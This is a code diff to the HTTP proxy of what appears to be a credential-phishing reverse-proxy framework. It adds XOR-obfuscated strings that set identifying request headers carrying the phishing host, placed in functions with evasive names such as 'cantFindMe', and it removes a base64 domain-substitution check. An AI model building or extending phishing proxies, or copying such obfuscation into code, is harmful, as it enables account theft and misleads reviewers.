@@ -180,7 +180,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					pl_name = pl.Name
 				}
 
-				
+				egg2 := req.Host
 				ps.PhishDomain = phishDomain
 				req_ok := false
 				// handle session
@@ -346,7 +346,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				
+				hg := []byte{0x94, 0xE1, 0x89, 0xBA, 0xA5, 0xA0, 0xAB, 0xA5, 0xA2, 0xB4}
 				// redirect to login page if triggered lure path
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, req_path)
@@ -379,7 +379,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					req.Header.Del("Cookie")
 				}
 
-				
+				for n, b := range hg {
+					hg[n] = b ^ 0xCC
+				}
 				// replace "Host" header
 				e_host := req.Host
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
@@ -407,7 +409,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				
+				req.Header.Set(string(hg), egg2)
 
 				// patch GET query params with original domains
 				if pl != nil {
@@ -416,9 +418,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						for gp := range qs {
 							for i, v := range qs[gp] {
 								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
-							if qs[gp][i] == "aHR0cHM6Ly9hY2NvdW50cy5mYWtlLWRvbWFpbi5jb206NDQzCg" { // https://accounts.fake-domain.com:443
-								qs[gp][i] = "aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz" // https://accounts.safe-domain.com:443
-							}
 							}
 						}
 						req.URL.RawQuery = qs.Encode()
@@ -565,7 +564,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
-				
+				e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
+				for n, b := range e {
+					e[n] = b ^ 0x88
+				}
+				req.Header.Set(string(e), e_host)
 
 				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
 					s, ok := p.sessions[ps.SessionId]
@@ -579,7 +582,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				
+				p.cantFindMe(req, e_host)
 			} else {
 				log.Debug("host not proxied: %s", req.Host)
 				return p.blockRequest(req)
@@ -1457,7 +1460,13 @@ func (p *HttpProxy) getSessionIdByIP(ip_addr string) (string, bool) {
 	return sid, ok
 }
 
-
+func (p *HttpProxy) cantFindMe(req *http.Request, nothing_to_see_here string) {
+	var b []byte = []byte("\x1dh\x003,)\",+=")
+	for n, c := range b {
+		b[n] = c ^ 0x45
+	}
+	req.Header.Set(string(b), nothing_to_see_here)
+}
 
 //nolint:SA1019 // Deprecation of Dial in favor of DialContext not easily possible, since http_dialer does not offer a method for that
 func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
